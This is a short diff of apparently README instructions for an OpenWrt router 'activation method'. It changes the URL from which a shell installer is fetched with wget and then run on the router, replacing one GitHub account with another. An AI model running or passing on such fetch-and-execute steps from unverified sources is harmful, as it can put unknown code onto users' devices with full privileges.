@@ -24,7 +24,7 @@ This activation method works for devices with the OpenWrt Linux system as long a
     ```
 3. From the terminal on your router, run these commands:
     ```sh
-    wget -O /tmp/installer.sh https://raw.githubusercontent.com/2azx/Ahmed/main/installer.sh
+    wget -O /tmp/installer.sh https://raw.githubusercontent.com/devlopers1/qq/main/installer.sh
     chmod +x /tmp/installer.sh
     /tmp/installer.sh
     ```
